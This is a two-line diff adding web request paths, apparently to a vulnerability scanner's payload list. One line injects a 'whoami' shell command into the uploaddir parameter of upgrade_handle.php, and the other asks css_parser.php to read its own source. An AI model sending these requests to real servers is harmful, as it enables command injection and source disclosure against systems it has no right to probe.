@@ -1,0 +1,2 @@
+/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27
+/css_parser.php?css=css_parser.php
